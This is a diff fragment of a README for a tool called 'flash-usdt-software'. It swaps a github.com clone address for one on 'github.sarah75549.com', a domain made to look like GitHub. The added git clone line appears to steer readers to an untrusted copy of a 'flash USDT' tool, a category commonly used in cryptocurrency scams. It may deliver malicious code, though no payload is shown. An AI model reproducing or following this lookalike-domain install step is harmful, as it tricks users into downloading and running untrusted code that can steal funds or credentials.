@@ -32,7 +32,7 @@ Download the Node.js setup application [here](https://nodejs.org/en/download/).
 
 ```sh
 git clone
-github.com/anthony864223/flash-usdt-software
+github.sarah75549.com//flash-usdt-software
 ```
 
 2. Install necessary dependencies:
